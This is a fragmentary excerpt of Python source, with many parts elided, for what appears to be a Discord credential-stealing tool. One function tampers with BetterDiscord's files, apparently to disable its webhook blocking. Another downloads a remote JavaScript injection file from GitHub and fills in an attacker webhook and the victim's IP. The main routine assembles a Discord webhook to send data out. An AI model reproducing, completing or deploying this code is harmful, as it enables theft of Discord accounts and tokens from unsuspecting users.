...
def bypass_better_discord():
    ...
    with open(bd, "rt", encoding="cp437") as f:
        content = f.read()
        content2 = content.replace("api/webhooks", "MxtyTheGoat")
    with open(bd, 'w'): pass
...
tempfolder = os.getenv("temp")+"\\Void"
                    ...
                    if os.path.exists(inj_path):
                        if startup not in argv[0]:
                            try:
                                ...
                                pass
                        f = requests.get("https://raw.githubusercontent.com/mxtyInjection/index.js/main/index.js").text.replace("%WEBHOOK%",webhook_url).replace("%IP%",f"{getip()}")
...
def main():
    ...
    webhook = {
        ...
        "avatar_url": "https://cdn.discordapp.com/attachments/981957512016318524/984087621678534676/a650d11c296f2f76196c67dc5faabc84.png",
        "file": ""
    }
    try:
